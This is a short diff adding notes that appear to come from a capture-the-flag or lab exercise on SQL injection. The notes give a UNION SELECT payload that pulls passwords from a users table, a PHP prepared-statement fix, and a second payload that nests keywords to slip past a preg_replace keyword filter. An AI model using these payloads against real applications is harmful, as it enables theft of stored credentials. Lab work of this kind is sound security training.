@@ -1,0 +1,10 @@
+flag 1: 1 UNION SELECT id, password FROM users
+SELECT id, username FROM users WHERE id=1 UNION SELECT id, password FROM users LIMIT 1;
+To sanitize:
+$stmt = $pdo->prepare("SELECT id, username FROM users WHERE id = ?");
+$stmt->execute([$user_input]);
+
+
+Level 2: The following keywords were found to be filtered by the application using preg_replace (): union, order, select, from, group, by. 
+So we can trick it like this
+1 UNUNIONION SELSELECTECT id, password FRFROMOM users
